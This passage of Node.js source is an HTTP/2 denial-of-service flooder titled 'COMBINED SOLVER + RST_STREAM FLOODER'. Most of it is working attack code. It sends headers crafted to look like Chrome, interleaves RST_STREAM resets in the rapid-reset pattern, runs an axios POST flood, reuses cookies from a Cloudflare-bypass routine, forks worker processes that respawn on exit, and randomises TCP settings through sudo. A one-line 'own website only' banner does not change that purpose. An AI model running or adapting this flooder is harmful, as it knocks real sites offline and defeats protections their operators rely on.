                ...(Math.random() < 0.996 ? [[4, custom_window]] : [[4, oke1]]),
                ...(Math.random() < 0.996 ? [[6, custom_header]] : [[6, oke2]]),
            ])),
            encodeFrame(0, 8, updateWindow)
        ];
        frames1.push(...frames);

        tlsSocket.on('data', (eventData) => {
            data = Buffer.concat([data, eventData]);
            while (data.length >= 9) {
                const frame = decodeFrame(data);
                if (frame != null) {
                    data = data.subarray(frame.length + 9);
                    if (frame.type == 4 && frame.flags == 0) tlsSocket.write(encodeFrame(0, 4, "", 1));
                    if (frame.type == 1) {
                        let status;
                        try {
                            const decoded = hpack.decode(frame.payload);
                            status = decoded.find(x => x[0] == ':status')?.[1];
                        } catch (e) {}
                        if (status) {
                            if (!statuses[status]) statuses[status] = 0;
                            statuses[status]++;

                            if (status == 403 || status == 429) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        }
                    }
                    if (frame.type == 7 || frame.type == 5) {
                        if (frame.type == 7 && debugMode) {
                            if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                            statuses["GOAWAY"]++;
                        }
                        tlsSocket.write(encodeRstStream(0, 3, 0));
                        tlsSocket.end(() => tlsSocket.destroy());
                    }
                } else break;
            }
        });

        tlsSocket.write(Buffer.concat(frames1));

        function main() {
            if (tlsSocket.destroyed) return;
            const requests = [];
            const customHeadersArray = [];

            if (customHeaders) {
                const customHeadersList = customHeaders.split('#');
                for (const header of customHeadersList) {
                    const [name, value] = header.split(':').map(part => part?.trim());
                    if (name && value) customHeadersArray.push({ [name.toLowerCase()]: value });
                    else console.warn(`Invalid header format for: ${header}`);
                }
            }

            let ratelimitLocal;
            if (randrate !== undefined) ratelimitLocal = getRandomInt(1, 64);
            else ratelimitLocal = process.argv[6];

            const fp = parseUAFull(session.userAgent);

            for (let i = 0; i < (isFull ? ratelimitLocal : 1); i++) {

                if (cdn1) {
                    const requestHeaders = {
                        'Accept': 'text/html',
                        'Host': url.hostname,
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Content-Type': 'application/json',
                        'Connection': 'keep-alive',
                        "upgrade-insecure-requests": "1",
                        'Cache-Control': 'no-cache',
                        'sec-ch-ua': fp.brands,
                        "accept-encoding": "gzip, deflate, br",
                        'Pragma': "no-cache",
                    };
                    const performRequest = async () => {
                        try {
                            await axios({
                                method: 'POST',
                                url: url.hostname,
                                headers: requestHeaders,
                                responseType: 'arraybuffer',
                                maxRedirects: 0,
                                timeout: 20000,
                            });
                        } catch (error) {}
                    };
                    const startFlood = async () => {
                        const endTime = performance.now() + time * 1000;
                        const itb = 1000 / ratelimit;
                        while (performance.now() < endTime) {
                            const requests33 = [];
                            for (let j = 0; j < threads; j++) {
                                requests33.push(new Promise(resolve => {
                                    setTimeout(() => { performRequest(); resolve(); }, itb * j);
                                }));
                            }
                            await Promise.all(requests33);
                            await new Promise(resolve => setTimeout(resolve, itb * threads));
                        }
                    };
                    startFlood();
                }

                // === Pseudo-headers (WAJIB di depan, urut) ===
                const pseudoHeaders = [
                    [":method", reqmethod],
                    [":authority", url.hostname],
                    [":scheme", "https"],
                    [":path", query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : "")],
                ];

                // === Browser headers (FIXED ORDER, match Chrome 131) ===
                // Chrome tidak shuffle header — urutan fixed seperti ini:
                const browserHeaders = [
                    ["sec-ch-ua", fp.brands],
                    ["sec-ch-ua-mobile", "?0"],
                    ["sec-ch-ua-platform", fp.platformHeader],
                    ["upgrade-insecure-requests", "1"],
                    ["user-agent", session.userAgent],
                    ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
                    ["sec-fetch-site", "none"],
                    ["sec-fetch-mode", "navigate"],
                    ["sec-fetch-user", "?1"],
                    ["sec-fetch-dest", "document"],
                    ["accept-encoding", "gzip, deflate, br, zstd"],
                    ["accept-language", "en-US,en;q=0.9"],
                ];

                // Cookie di akhir (Chrome taruh cookie setelah accept-language)
                const cookieHeader = cookieString ? [["cookie", cookieString]] : [];
                const customArr = customHeadersArray.map(h => Object.entries(h)[0]);

                const combinedHeaders = [
                    ...pseudoHeaders,
                    ...browserHeaders,
                    ...cookieHeader,
                    ...customArr
                ].filter(([_, v]) => v != null && v !== "");

                if (limit) {
                    async function makeRequest(u) {
                        while (true) {
                            try {
                                const response = await axios.get(u);
                                return response.data;
                            } catch (error) {
                                if (error.response && error.response.status === 429) {
                                    const retryAfter = parseInt(error.response.headers['retry-after']) || 5;
                                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                                } else throw error;
                            }
                        }
                    }
                    makeRequest(url).catch(() => {});
                }

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(combinedHeaders)
                ]);

                // Flags: END_STREAM | END_HEADERS | PRIORITY (0x25)
                // PRIORITY flag membutuhkan 5 byte priority info di awal payload
                const priorityInfo = Buffer.alloc(5);
                priorityInfo.writeUInt32BE(0, 0);  // exclusive=0, depends_on=0
                priorityInfo.writeUInt8(256 - 1, 4); // weight = 256 (encoded sebagai 255)

                const packedWithPriority = Buffer.concat([priorityInfo, packed]);
                const encodedFrame = encodeFrame(streamId, 1, packedWithPriority, 0x25);

                if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                    const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
                    tlsSocket.write(Buffer.concat([rstStreamFrame, encodedFrame]));
                    STREAMID_RESET = 0;
                } else {
                    requests.push(encodedFrame);
                }

                streamId += 2;
            }

            tlsSocket.write(Buffer.concat(requests), (err) => {
                if (err) { tlsSocket.destroy(); return; }
                const jitter = 5 + Math.floor(Math.random() * 25);
                setTimeout(() => main(), (1000 / ratelimit) + jitter);
            });
        }
        main();
    }).on('error', () => tlsSocket.destroy());
}

// ============================================================
// TCP CHANGES (LINUX ONLY)
// ============================================================
function TCP_CHANGES_SERVER() {
    const cc1 = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'][Math.floor(Math.random() * 5)];
    const sack = ['1', '0'][Math.floor(Math.random() * 2)];
    const ws = ['1', '0'][Math.floor(Math.random() * 2)];
    const ts = ['1', '0'][Math.floor(Math.random() * 2)];
    const sa = ['1', '0'][Math.floor(Math.random() * 2)];
    const tfo = ['3', '2', '1', '0'][Math.floor(Math.random() * 4)];
    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${cc1} net.ipv4.tcp_sack=${sack} net.ipv4.tcp_window_scaling=${ws} net.ipv4.tcp_timestamps=${ts} net.ipv4.tcp_sack=${sa} net.ipv4.tcp_fastopen=${tfo}`;
    exec(command, () => {});
}

setInterval(() => { timer++; }, 1000);
setInterval(() => {
    if (timer <= 10) {
        custom_header += 1;
        custom_window += 1;
        custom_table += 1;
        custom_update += 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

// ============================================================
// MAIN
// ============================================================
(async () => {
    if (cluster.isMaster) {
        console.clear();
        console.log("\x1b[35mCOMBINED SOLVER + RST_STREAM FLOODER v1.3\x1b[0m");
        console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");

        const sessions = await bypassCloudflareParallel(cookieCount);
        sessions.forEach((s, i) => printSessionDetails(s, i));

        const sessionFile = `./.sessions_${Date.now()}.json`;
        const sessionsForWorkers = sessions.map(s => ({
            userAgent: s.userAgent,
            cookies: s.cookies,
            cookieString: s.cookies.map(c => `${c.name}=${c.value}`).join("; "),
            cfClearance: s.cfClearance,
            headers: s.headers
        }));
        fs.writeFileSync(sessionFile, JSON.stringify(sessionsForWorkers));
        process.env.SESSION_FILE = sessionFile;
        process.env.SESSION_COUNT = String(sessions.length);

        console.log(`\n\x1b[32mSaved ${sessionsForWorkers.length} session(s) to ${sessionFile}\x1b[0m`);
        console.log(`\x1b[36mSample UA:\x1b[0m ${sessionsForWorkers[0].userAgent}`);
        console.log(`\x1b[36mSample Cookie:\x1b[0m ${sessionsForWorkers[0].cookieString.substring(0, 120)}...\n`);

        for (let i = 0; i < threads; i++) {
            cluster.fork({
                SESSION_FILE: sessionFile,
                SESSION_COUNT: String(sessions.length),
                core: i % os.cpus().length
            });
        }
        console.log(`\x1b[32mSent Attack Successfully (${threads} workers)\x1b[0m`);

        const workers = {};
        cluster.on('exit', (worker) => {
            cluster.fork({
                SESSION_FILE: process.env.SESSION_FILE,
                SESSION_COUNT: process.env.SESSION_COUNT,
                core: worker.id % os.cpus().length
            });
        });
        cluster.on('message', (worker, message) => {
            workers[worker.id] = [worker, message];
        });

        if (debugMode) {
            setInterval(() => {
                let statusesAgg = {};
                for (let w in workers) {
                    if (workers[w][0].state == 'online') {
                        for (let st of workers[w][1]) {
                            for (let code in st) {
                                if (statusesAgg[code] == null) statusesAgg[code] = 0;
                                statusesAgg[code] += st[code];
                            }
                        }
                    }
                }
                console.clear();
                console.log(new Date().toLocaleString('us'), statusesAgg);
            }, 1000);
        }

        setInterval(TCP_CHANGES_SERVER, 5000);

        setTimeout(() => {
            try { fs.unlinkSync(process.env.SESSION_FILE); } catch (e) {}
            process.exit(1);
        }, time * 1000);

    } else {
        let ALL_SESSIONS = [];
        try {
            const raw = fs.readFileSync(process.env.SESSION_FILE, 'utf8');
            ALL_SESSIONS = JSON.parse(raw);
            if (!Array.isArray(ALL_SESSIONS) || ALL_SESSIONS.length === 0) throw new Error("empty");
        } catch (e) {
            ALL_SESSIONS = [{
                userAgent: pickRealUA(),
                cookieString: ""
            }];
        }

        function pickSession() {
            const s = ALL_SESSIONS[Math.floor(Math.random() * ALL_SESSIONS.length)];
            session = { userAgent: s.userAgent || session.userAgent };
            cookieString = s.cookieString || "";
            return s;
        }
        pickSession();

        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 30000) consssas++;
            else { clearInterval(someee); return; }
            pickSession();
            try { go(); } catch (e) {}
        }, delay > 0 ? delay : 5);

        if (debugMode) {
            setInterval(() => {
                if (statusesQ.length >= 4) statusesQ.shift();
                statusesQ.push(statuses);
                statuses = {};
                try { process.send(statusesQ); } catch (e) {}
            }, 250);
        }

        setTimeout(() => process.exit(1), time * 1000);
    }
})();
